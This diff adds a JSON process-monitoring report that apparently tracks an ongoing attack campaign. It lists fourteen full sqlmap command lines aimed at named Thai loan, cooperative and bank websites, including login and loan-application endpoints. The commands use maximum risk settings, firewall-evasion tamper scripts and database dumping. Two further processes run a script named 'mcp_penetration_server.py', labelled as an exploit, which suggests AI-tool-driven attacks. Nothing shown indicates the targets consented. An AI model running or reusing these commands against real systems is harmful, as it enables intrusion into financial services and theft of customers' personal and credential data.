@@ -1,0 +1,125 @@
+{
+  "report_time": "2025-10-29T08:08:20.159747",
+  "monitoring_status": "Active",
+  "statistics": {
+    "active_attacks": 0,
+    "total_alerts": 0,
+    "total_processes": 16
+  },
+  "recent_successes": [],
+  "vulnerability_alerts": [],
+  "monitored_processes": [
+    {
+      "pid": 17884,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://ngoenmun.com/news?id=1 -p id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --dbs --tables --dump --threads=6 --time-sec=10",
+      "target": "https://ngoenmun.com/news?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 20524,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://ngoenmun.com/api/v1/loan-application?id=1 -p id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --dbs --tables --dump --threads=10 --time-sec=20",
+      "target": "https://ngoenmun.com/api/v1/loan-application?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 21148,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://peacoop.or.th/category/services/general-loan/?s=test -p s --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --dbs --tables --dump --threads=8 --time-sec=20",
+      "target": "https://peacoop.or.th/category/services/general-loan/?s=test",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 24672,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://quickcash.in.th/apply?loan_id=1 -p loan_id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode,between --fresh-queries --time-sec=20 --threads=10 --banner --current-db --dbs --tables",
+      "target": "https://quickcash.in.th/apply?loan_id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 34860,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://mula-x.com/register --method=POST --data=username=test&email=test@example.com&password=test123&phone=1234567890 -p username --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --dbs --tables --dump --threads=10 --time-sec=20",
+      "target": "https://mula-x.com/register",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 39188,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://quickcash.in.th/application.php?id=1 -p id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode,between,modsecurityversioned --fresh-queries --time-sec=15 --threads=8 --banner --current-db --dbs",
+      "target": "https://quickcash.in.th/application.php?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 41292,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://ngoenmun.com/api/v1/auth/login --method=POST --data=username=admin&password=admin123 -p username --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --dbs --tables --dump --threads=8 --time-sec=15",
+      "target": "https://ngoenmun.com/api/v1/auth/login",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 44944,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://peacoop.or.th/members?id=1 -p id --batch --fresh-queries --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --dbs --tables --dump --threads=6",
+      "target": "https://peacoop.or.th/members?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 54656,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u http://127.0.0.1:5000/user?id=1 -p id --batch --level=1 --risk=1 --fresh-queries --banner --current-db --tables --dump -D testdb -T users -C id,username,password --limit=3",
+      "target": "http://127.0.0.1:5000/user?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 54760,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://ngoenmun.com/search?q=test -p q --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode,between,modsecurityversioned --dbs --tables --dump --threads=10 --time-sec=15",
+      "target": "https://ngoenmun.com/search?q=test",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 55564,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://mula-x.com/calculator?amount=10000 -p amount --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --dbs --tables --dump --threads=8 --time-sec=15",
+      "target": "https://mula-x.com/calculator?amount=10000",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 67228,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://quickcash.in.th/apply?loan_id=1 -p loan_id --batch --fresh-queries --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --dbs --tables --dump --threads=10",
+      "target": "https://quickcash.in.th/apply?loan_id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 67652,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://www.gsb.or.th/csr/sustainable/csr-projects/csr-news/activities/?category=1461 --dbs --batch --level=5 --risk=3 --tamper=charencode,randomcase,space2comment --user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 --headers=X-Requested-With: XMLHttpRequest --delay=2",
+      "target": "https://www.gsb.or.th/csr/sustainable/csr-projects/csr-news/activities/?category=1461",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 73340,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\sqlmap.exe -u https://peacoop.or.th/about?id=1 -p id --batch --level=5 --risk=3 --random-agent --tamper=space2comment,randomcase,charencode --dbs --tables --dump --threads=6 --time-sec=10",
+      "target": "https://peacoop.or.th/about?id=1",
+      "type": "SQLMap Attack",
+      "status": "Running"
+    },
+    {
+      "pid": 27232,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe mcp_penetration_server.py",
+      "target": "mcp_penetration_server.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    },
+    {
+      "pid": 30964,
+      "command": "C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python311\\python.exe mcp_penetration_server.py",
+      "target": "mcp_penetration_server.py",
+      "type": "Python Exploit",
+      "status": "Running"
+    }
+  ]
+}
